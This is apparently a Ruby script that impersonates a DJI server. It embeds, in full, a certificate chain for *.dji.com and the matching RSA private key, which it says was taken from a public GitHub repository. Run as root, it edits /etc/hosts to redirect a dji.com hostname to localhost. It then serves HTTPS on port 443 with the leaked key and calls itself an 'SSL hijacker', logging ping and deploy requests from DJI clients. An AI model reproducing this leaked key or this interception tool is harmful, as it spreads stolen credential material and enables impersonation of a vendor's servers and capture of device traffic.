# What is better than a Platinum Mavic, or an Obsidian Phantom?
# DJI SSL cert private keys!
# Who needs gold when you have Unobtainium
#
# MD5 (dji_com.crt) = c25e14b10cd8cabc5f0e77e69a22835b
# MD5 (dji_com.key) = c77b748a6e768dd665dda8cf9b335dfb
# 
# Originally obtained from:
# https://github.com/lizhanbin/real_time_serve_v1/blob/master/cert/
#  
require 'webrick'
require 'openssl'
require 'webrick/https'

if ENV['USER'] == "root"
    puts "Running as root... thanks!\n" 
else
    puts "Run as root please\n"
    exit
end
filepath = "/etc/hosts"
if File.readlines(filepath).grep(/originalgangsters\.dji\.com/).size > 0
  puts "Original Gangsters are already in your hosts file\n"
else
  puts "Adding entry for Original Gangster DJI redirection to ${filepath}\n"
  File.open(filepath, 'a') {|f| f.write("\n127.0.0.1 originalgangsters.dji.com\n") }
end

cert = OpenSSL::X509::Certificate.new( 
"-----BEGIN CERTIFICATE-----
MIIHPjCCBiagAwIBAgIMWubaiw248B8E9jv7MA0GCSqGSIb3DQEBCwUAMEwxCzAJ
BgNVBAYTAkJFMRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMSIwIAYDVQQDExlB
bHBoYVNTTCBDQSAtIFNIQTI1NiAtIEcyMB4XDTE3MDYwNDEwMDAzMloXDTE4MDYw
NTEwMDAzMlowNzEhMB8GA1UECxMYRG9tYWluIENvbnRyb2wgVmFsaWRhdGVkMRIw
EAYDVQQDDAkqLmRqaS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQD5UuubTPqdEFtkvIhHbL999mlOncU7E9d1CTCllzUPso3Xo6KWHydK+YDGCtYP
byUuRGNnXkzz6U3TC9Nqh3n67BKYm3mKKzas8sDucdHTg4V36Xoors6HNgh/S3Pe
DjUVktJlIrVhhTMboG7E3cv63a9kNofukyOxPSW8YKfK+GYz8KrSQ1aGK4CE79iH
2QR/pPr4JRDyDpDo7G4+mQjrVovHz7UXMgONJV2527gnIGtfcGFdxCZweSF4gBWV
i2ZrNzZKyMDJ07wMy7SSa0rUw7zoH6Dgbob+VBH4JUPSXgrlpIGSL9FCxBpMXAKK
0bucyBRj7LBSqVJCunMhoPGNAgMBAAGjggQzMIIELzAOBgNVHQ8BAf8EBAMCBaAw
gYkGCCsGAQUFBwEBBH0wezBCBggrBgEFBQcwAoY2aHR0cDovL3NlY3VyZTIuYWxw
aGFzc2wuY29tL2NhY2VydC9nc2FscGhhc2hhMmcycjEuY3J0MDUGCCsGAQUFBzAB
hilodHRwOi8vb2NzcDIuZ2xvYmFsc2lnbi5jb20vZ3NhbHBoYXNoYTJnMjBXBgNV
HSAEUDBOMEIGCisGAQQBoDIBCgowNDAyBggrBgEFBQcCARYmaHR0cHM6Ly93d3cu
Z2xvYmFsc2lnbi5jb20vcmVwb3NpdG9yeS8wCAYGZ4EMAQIBMAkGA1UdEwQCMAAw
PgYDVR0fBDcwNTAzoDGgL4YtaHR0cDovL2NybDIuYWxwaGFzc2wuY29tL2dzL2dz
YWxwaGFzaGEyZzIuY3JsMB0GA1UdEQQWMBSCCSouZGppLmNvbYIHZGppLmNvbTAd
BgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwHQYDVR0OBBYEFLK7Uv6NQDk2
nwivFf4WyHVYI8t9MB8GA1UdIwQYMBaAFPXN1TwIUPlqTzq3l9pWg+Zp0mj3MIIC
bQYKKwYBBAHWeQIEAgSCAl0EggJZAlcAdwDd6x0reg1PpiCLga2BaHB+Lo6dAdVc
iI09EcTNtuy+zAAAAVxyjJIqAAAEAwBIMEYCIQCksVJcJhh2kjX6uObRNS0tH84M
rHkjdrPMDZcCb7WKsQIhAPtqI206ksF3pArbVNxmNIjGkCBu5zhOgaaXBlltrvHo
AHUApLkJkLQYWBSHuxOizGdwCjw1mAT5G9+443fNDsgN3BAAAAFccoySLQAABAMA
RjBEAiBtebn2JimmAQ6mSdbejyQXtjMKNKTVIPf1FEJzpbA3HQIgBb42ymO6WQFf
NdudwlbRufF7eN1KJo6mwvMzHgkdw48AdQBWFAaaL9fC7NP14b1Esj7HRna5vJkR
XMDvlJhV1onQ3QAAAVxyjJJMAAAEAwBGMEQCIDA2gYzjc1AlS+EpW/33MBb2587E
21V7lNScf6vYOVDNAiA0TdQ4KUVIXYo0KtBrqhLyFSdHQEiqR/2D3F4RJ2nYKwB2
ALvZ37wfinG1k5Qjl6qSe0c4V5UKq1LoGpCWZDaOHtGFAAABXHKMkvkAAAQDAEcw
RQIgAUj70Of2kp/QJ4nfvCnWP3v9Ne5IXX3+OGcupeZugWYCIQDSeTvKRb7tsP8P
ubGTorpVOM11AKlZdDwTWarYlSSN6wB2AO5Lvbd1zmC64UJpH6vhnmajD35fsHLY
gwDEe4l6qP3LAAABXHKMlVYAAAQDAEcwRQIhAKlwIpKCqc3/Evka9alOrMZWvSeS
XvpAZt8MB4PV6uM0AiBXA4VfuaCoXtEbYRNESvLCqvwNA2J9Dhgw67v7KaZZNTAN
BgkqhkiG9w0BAQsFAAOCAQEArKAniBPPdrMFsd40h3vD4Oka04XabrAOqI/rG2zv
99YCWQFHLNjnVa13IKgg6Wc9B4fG6ARtQHVz/vfzsGPnq1oxZy9fRF6VC2kJVu/X
ZyFWFBGZQYBeJ24WFMR4rIz9ibzlaVlD4W6b8tdBuVIu8ymAza45NNT7R3p0i5Ve
oZJIpF7F/Lj5ggzU5i1FZyFGqzuLhRZJK8fTs7HiERQjCXKKxc9u2L3QtFd0CqVt
Ct3zRP4GK128aeBPs/KN2A94OafUvrfo69jAdyUgD7isclGKPonfRKvp4nStjhnb
9eNgA4rgl4jpajuwPTWZB9cCXTOB4dxbYUSVaGq9sWkCwQ==
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIETTCCAzWgAwIBAgILBAAAAAABRE7wNjEwDQYJKoZIhvcNAQELBQAwVzELMAkG
A1UEBhMCQkUxGTAXBgNVBAoTEEdsb2JhbFNpZ24gbnYtc2ExEDAOBgNVBAsTB1Jv
b3QgQ0ExGzAZBgNVBAMTEkdsb2JhbFNpZ24gUm9vdCBDQTAeFw0xNDAyMjAxMDAw
MDBaFw0yNDAyMjAxMDAwMDBaMEwxCzAJBgNVBAYTAkJFMRkwFwYDVQQKExBHbG9i
YWxTaWduIG52LXNhMSIwIAYDVQQDExlBbHBoYVNTTCBDQSAtIFNIQTI1NiAtIEcy
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2gHs5OxzYPt+j2q3xhfj
kmQy1KwA2aIPue3ua4qGypJn2XTXXUcCPI9A1p5tFM3D2ik5pw8FCmiiZhoexLKL
dljlq10dj0CzOYvvHoN9ItDjqQAu7FPPYhmFRChMwCfLew7sEGQAEKQFzKByvkFs
MVtI5LHsuSPrVU3QfWJKpbSlpFmFxSWRpv6mCZ8GEG2PgQxkQF5zAJrgLmWYVBAA
cJjI4e00X9icxw3A1iNZRfz+VXqG7pRgIvGu0eZVRvaZxRsIdF+ssGSEj4k4HKGn
kCFPAm694GFn1PhChw8K98kEbSqpL+9Cpd/do1PbmB6B+Zpye1reTz5/olig4het
ZwIDAQABo4IBIzCCAR8wDgYDVR0PAQH/BAQDAgEGMBIGA1UdEwEB/wQIMAYBAf8C
AQAwHQYDVR0OBBYEFPXN1TwIUPlqTzq3l9pWg+Zp0mj3MEUGA1UdIAQ+MDwwOgYE
VR0gADAyMDAGCCsGAQUFBwIBFiRodHRwczovL3d3dy5hbHBoYXNzbC5jb20vcmVw
b3NpdG9yeS8wMwYDVR0fBCwwKjAooCagJIYiaHR0cDovL2NybC5nbG9iYWxzaWdu
Lm5ldC9yb290LmNybDA9BggrBgEFBQcBAQQxMC8wLQYIKwYBBQUHMAGGIWh0dHA6
Ly9vY3NwLmdsb2JhbHNpZ24uY29tL3Jvb3RyMTAfBgNVHSMEGDAWgBRge2YaRQ2X
yolQL30EzTSo//z9SzANBgkqhkiG9w0BAQsFAAOCAQEAYEBoFkfnFo3bXKFWKsv0
XJuwHqJL9csCP/gLofKnQtS3TOvjZoDzJUN4LhsXVgdSGMvRqOzm+3M+pGKMgLTS
xRJzo9P6Aji+Yz2EuJnB8br3n8NA0VgYU8Fi3a8YQn80TsVD1XGwMADH45CuP1eG
l87qDBKOInDjZqdUfy4oy9RU0LMeYmcI+Sfhy+NmuCQbiWqJRGXy2UzSWByMTsCV
odTvZy84IOgu/5ZR8LrYPZJwR2UcnnNytGAMXOLRc3bgr07i5TelRS+KIz6HxzDm
MTh89N1SyvNTBCVXVmaU6Avu5gMUTu79bZRknl7OedSyps9AsUSoPocZXun4IRZZ
Uw== 
-----END CERTIFICATE-----")

pkey = OpenSSL::PKey::RSA.new(
"-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQD5UuubTPqdEFtk
vIhHbL999mlOncU7E9d1CTCllzUPso3Xo6KWHydK+YDGCtYPbyUuRGNnXkzz6U3T
C9Nqh3n67BKYm3mKKzas8sDucdHTg4V36Xoors6HNgh/S3PeDjUVktJlIrVhhTMb
oG7E3cv63a9kNofukyOxPSW8YKfK+GYz8KrSQ1aGK4CE79iH2QR/pPr4JRDyDpDo
7G4+mQjrVovHz7UXMgONJV2527gnIGtfcGFdxCZweSF4gBWVi2ZrNzZKyMDJ07wM
y7SSa0rUw7zoH6Dgbob+VBH4JUPSXgrlpIGSL9FCxBpMXAKK0bucyBRj7LBSqVJC
unMhoPGNAgMBAAECggEAaUP/QcSQkzvSuod3KmDZwL8G2zB1k2nfMAS/S0q6FnSW
upLWFHf2yQrqubLdigqtMgmhxoTkDJ9WQmLd0j5829pMR65s9E8meILNvl7D7n+7
HFOxRff4LtI7aDNdKkXpV8BzoEu1NQVd/K4R1oCmnLZ4VOFJJwtsqGpewlg0v9an
SauW33Uio5sAFn8PA2vAbzwU5QrtNsagbkrqcOZkKRbGyIhGBU2IUXRwvQd6+Sdz
ks8ppDn0ylPZQowM2+iVyVKqtDNBNFvMz6TSEo6QgAqmMaIgcyBBKAlgI72GEU7j
fV2e+D7rvwv1wvDy7rM9Bg+4QM7ztTzYacwRXPjxqQKBgQD98xybJ3wm4wN1onjL
g6U/bEQ9+R77x3OFfnwaWre7Y2Ig/VKL2yv0qerW8kVv7271dH6A2A0jNNu914LP
U7AgaJ0U2Yy8Z4ob67cyCsacBUmACdIns9x4aJNoARXH0WvRHdDUHCtNwGrvVkLH
6nUrcuCWo6DvsefC+4/8dDqrWwKBgQD7Vj9ljVHoe78luEQKWPFJes8vrBwjB01H
zbx2yj6gTai84VTRU6z3RIO5x+/ENKLauVkMzrwOBJjcDEMhuywsxZdDJfFg2dmO
Qnudm06TLb5ik5TSvUg+IxRkV+5TzkYiDm1UejzNZSbsK2t/gDNNXxiF+v9O+dQH
mitgxxkzNwKBgFy6+Hgja+9bN/ktkcRm1uGY7DZhEJJJ24IklLae57ZybPO07P6K
0rstjMZeg0KDgNX6avMrcWiotZDV8Ds6yPacnLdvVTe66zCU2zlXu/xe5d7uNyIu
SFRjg2gX9VcYvrEGnSnG+30RxTqOGiacE5sBAMehCnRcV0/YwlQiMQY/AoGBAPeC
cP411FKpAo1H0CGMg1lESqJ80FyihTVP4ufstQ2yTJhtItTdnTkITNx4i6Lh3vqc
iph1QnZfipUwsi+WnqMclqB2ziT9hCR3TjrgRdnks1dqVKXP50Ph0eQbP8ViHmjN
YldN5XCzy0fKXpt6CYuJOaI/kosYtfgil9M/Xo6zAoGBAKc9bzo/uzq2Z/CO3tvi
w+Sb29kXM3bpHfqgfPF5/h0d2jbRZslzZwKFPHvPpMBTT0F0avU7myb1DAZqpLdl
o7vctvmBI2WAe7AD0mc9KQDhYld0pH0jgdFr2TazjliQvxLWCqcESdPKcCdcDpqK
2IWo7KZo3Yl6/gJll/pOq1zd
-----END PRIVATE KEY-----")

include WEBrick

s = HTTPServer.new( :Port => 443, 
:SSLEnable => true , 
:SSLCertificate => cert,
:SSLPrivateKey => pkey
)

puts "DJI Unobtanium SSL hijacker has launched"

class PING < HTTPServlet::AbstractServlet
 def do_POST(req, res)
   res.body = "<html>deez nuts</html>"
   puts "DJI SSL client was sent ping: #{req.body}"
 end
end

class DEPLOY < HTTPServlet::AbstractServlet
 def do_POST(req, res)
   res.body = "<html>deez nuts</html>"
   puts "DJI SSL client was sent deploy: #{req.body}"
 end
end

s.mount("/", PING)
s.mount("/zzzzz", DEPLOY)

trap("INT"){ s.shutdown }
s.start

